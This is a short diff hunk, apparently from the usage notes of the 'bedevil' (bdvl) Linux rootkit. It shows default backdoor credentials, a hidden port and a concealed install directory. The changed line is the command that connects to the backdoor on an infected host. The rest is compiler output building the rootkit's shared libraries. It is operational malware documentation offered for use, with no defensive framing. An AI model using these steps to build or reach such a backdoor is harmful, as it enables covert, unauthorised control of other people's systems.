@@ -44,7 +44,7 @@ Username: changeme
 Password: changeme
 Hidden port: 13337
 Install directory: /etc/hostslpxdf
-        bash etc/ssh.sh changeme <host> 13337
+        sh etc/ssh.sh changeme <host> 13337
 cc -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.x86_64 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.x86_64
 cc -m32 -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.i686 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.i686 2>/dev/null
 make: [Makefile:17: kit] Error 1 (ignored)
